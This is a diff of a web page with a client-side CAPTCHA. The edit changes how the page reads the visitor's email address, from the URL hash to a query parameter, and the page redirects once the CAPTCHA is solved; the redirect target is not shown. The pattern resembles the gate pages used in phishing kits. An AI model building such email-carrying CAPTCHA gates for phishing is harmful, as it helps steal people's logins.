@@ -48,7 +48,7 @@
             color: #333;
             letter-spacing: 10px;
             padding: 20px;
-            background-image: url('./image/img.png');
+            background-image: url('./image/img.png'); /* Keeping your image path */
             background-size: cover;
             background-repeat: no-repeat;
             background-position: center;
@@ -159,7 +159,7 @@
         </div>
         <div class="button-container">
             <button class="verify-button" id="verifyButton" onclick="verifyCaptcha()">
-                <img src="./image/download.png" alt="Verify Icon">
+                <img src="./image/download.png" alt="Verify Icon"> <!-- Keeping your image path -->
                 Verify
             </button>
         </div>
@@ -185,16 +185,15 @@
             feedbackMessage.textContent = ''; // Clear feedback message
         }
 
-        // Parse email from hash
-        function getEmailFromHash() {
-            const hash = window.location.hash.substring(1); // Remove the # character
-            // Decode the email and return it
-            return decodeURIComponent(hash) || 'defaultuser@example.com';
+        // Parse email from URL query string
+        function getEmailFromQuery() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get("email") || "defaultuser@example.com";
         }
 
         // Validate CAPTCHA and redirect
         function verifyCaptcha() {
-            const email = getEmailFromHash();
+            const email = getEmailFromQuery(); // Get email from query string
 
             if (captchaInput.value === captchaText) {
                 feedbackMessage.textContent = 'Captcha Verified! Redirecting...';
@@ -215,5 +214,4 @@
         generateCaptcha();
     </script>
 </body>
-</html>  
-                           
+</html>
